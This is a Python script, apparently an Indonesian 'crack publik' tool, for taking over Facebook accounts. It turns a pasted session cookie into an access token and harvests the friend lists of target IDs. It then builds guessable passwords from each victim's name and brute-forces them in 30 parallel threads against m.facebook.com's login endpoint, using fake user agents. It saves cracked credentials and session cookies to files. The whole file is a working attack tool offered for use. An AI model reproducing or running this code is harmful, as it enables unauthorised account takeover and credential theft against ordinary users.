copyright = 'Jun Pakaya'

#<MODULE>
try:
        import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
        from rich.table import Table as me
        from rich.console import Console as sol
        from bs4 import BeautifulSoup as sop
        from concurrent.futures import ThreadPoolExecutor as tred
        from rich.console import Group as gp
        from rich.panel import Panel as nel
        from rich import print as cetak
        from rich.markdown import Markdown as mark
        from rich.columns import Columns as col
        from rich import print as rprint
        from rich import pretty
        from rich.text import Text as tekz
except Exception as e :
	print('*-> module gagal.')
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,princp= [],[],0,0,0,[],[],[],[],[],[],[]
method,pwpluss,pwnya,mooz,cokbrut,lisensiku,CON=[],[],[],[],[],[],sol()
ses=requests.Session()
pretty.install()
#<API PROXY>
try    :
        appi= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
        open('my-proxy','w').write(appi)
except Exception as e:
        print('periksa koneksi kamu..')
        print('Tunggu Sebentar..')
        appi=open('my-proxy','r').read().splitlines()
#<USER AGENT>
for kw in range(10000):
      aa='Mozilla/5.0 (Windows NT 10.0;'
      b=random.choice(['6','7','8','9','10','11','12'])
      c='WOW64)'
      d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
      e=random.randrange(1, 999)
      f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
      g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
      h=random.randrange(73,100)
      i='0'
      j=random.randrange(4200,4900)
      k=random.randrange(40,150)
      l='Safari/537.36 Vivaldi/6.0.2979.18'
      junxy=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
      mooz.append(junxy)
for hi in range(1000):
      aa='Mozilla/5.0 (Windows NT 10.0;'
      b=random.choice(['6','7','8','9','10','11','12'])
      c='WOW64)'
      d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
      e=random.randrange(1, 999)
      f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
      g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
      h=random.randrange(73,100)
      i='0'
      j=random.randrange(4200,4900)
      k=random.randrange(40,150)
      l='Safari/537.36 Vivaldi/6.0.2979.18'
      junxy=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
      mooz.append(junxy)

#<WARNA>
P = '\x1b[1;97m' # PUTIH
H = '\x1b[1;92m' # HIJAU 
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'    # NETRAL
x = '\33[m'      # DEVAULT
m = '\x1b[1;91m' # RED +
k = '\033[93m'   # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'   # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m' # BIRU +

#<MENU PILIHAN>
def memasuki():
	try:
		token = open('token.txt','r').read()
		cok = open('coki.txt','r').read()
		tokenku.append(token)
		try:
			menu()
		except KeyError:
			cokies()
		except requests.exceptions.ConnectionError:
			print('Konesi Melambat..')
			exit()
	except IOError:
		cokies()
#<BANNNER>
def logo():
	print(f'''\n{P}
 _    _ _____ __ __  _
|  \/  | ____|_   _|/ \ 
| |\/| |  _|   | | / _ \ 
| |  | | |___  | |/ ___ \ 
|_|  |_|_____| |_/_/   \_\ ''')

def menu():
    os.system('clear');logo()
    print('-'*35);print(f'By : {copyright}');print('-'*35)
    print('01 : CRACK PUBLIK')
    print('02 : RESULT CRACK')
    print('03 : DELETE COKIES')
    print('-'*35)
    menu = input('* -> use : ')
    if menu in ('1','01'): crackk()
    if menu in ('2','02'): print('ressult success')
    if menu in ('3','03'): os.remove('coki.txt'); os.remove('token.txt'); print('*-->\033[91;1m Delete Cokies Succes..')
    else: print('*--> \033[91;1mmenu belum tersedia..')
#<CRACK PUBLIK>
def crackk():    
 try:
  toki = open('token.txt','r').read()
  coki = open('coki.txt','r').read()
 except IOError:
     exit()
 try:
  print('---------------')
  print('max 20 id')
  print('---------------')
  mulung = int(input(f'*--> Jumlah :  '))
 except ValueError:
     exit()
 if mulung<1 or mulung>20:
     exit()
 ses=requests.Session()
 semuaa = 0
 for KOTG49H in range(mulung):
  semuaa+=1
  Masukan = input(f'Id {semuaa} : ')
  uid.append(Masukan)
 for user in uid:
     try:
        head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
        if len(id) == 0:
            params = ({'access_token': toki,'fields': "friends"})
        else:
            params = ({'access_token': toki,'fields': "friends"})
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':coki}).json()
        for jun in url['friends']['data']:
            try:
                woy = (jun['id']+'|'+jun['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       print(f'terkumpul {len(id)}')
       gasken()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()
#<SETTING>
def gasken():
	print('-'*35)
	print('1. Akun Muda ')
	print('2. Akun Random ')
	print('-'*35)
	hu = input('*--> : ')
	if hu in ['1','01']:
		muda=[]
		for hihi in sorted(id):
			muda.append(hihi)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('*--> Tolong pilih denggan benar..')
		exit()
	print('-'*35)
	print('1. Mobile ')
	print('-'*35)
	hc = input('*--> : ')
	if hc in ['1','01']:
		method.append('metodeku')
		menjalankan()
	else:
		method.append('metodeku');menjalankan()
#<DATE-TIME>
cuk = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = cuk[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okku = 'res-ok-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpku = 'res-cp-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#<KATA-SANDI>       
def menjalankan():
	print('-'*35)
	print(f'*-> OK SAVE IN : {cpku}')
	print(f'*-> CP SAVE IN : {okku}')
	print('-'*35)
	print('mode pesawat jika tidak keluar hasil')
	print('-'*35)
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						
			else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'03')
						pwv.append(frs+'02')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'metodeku' in method:
				pool.submit(crack,idf,pwv)
	print('')
	print('-'*35)
	print('crack selesai denggan hasil')
	print(f'OK : {ok}')
	print(f'CP : {cp}')
	print('-'*35)
	exit()
#<METODE-CRACK>
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [OK/{ok}]:[CP/{cp}]:[{loop}/{len(id)}]:[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(mooz)
	ua2 = random.choice(mooz)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*──> {K}{idf}|{pw}{N}')     
				open('res-cp/'+cpku,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r*──> {H}{idf}|{pw}|{kuki}{N}')
				open('res-ok/'+okku,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def cokies():
	try:
		print('MASUKAN C0KIES')
		print('-'*35)
		int_coki = input('*--> ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookies': int_coki}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("*--> \033[91;1mCokiess kamu Kagak Berfungsi..!")
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': int_coki})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookies': int_coki}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': int_coki}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookies': int_coki}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookies': int_coki}).text
							heh = re.search('"access_token": "(.*?)"', str(response7)).group(1).replace('["','')
							print("")
							toke = open("token.txt","w").write(heh)
							cuki = open("coki.txt","w").write(int_coki);menu()
			except Exception as e:
				print('Tolong Gunakan Cokies Yang Masih Fresh')
	except:pass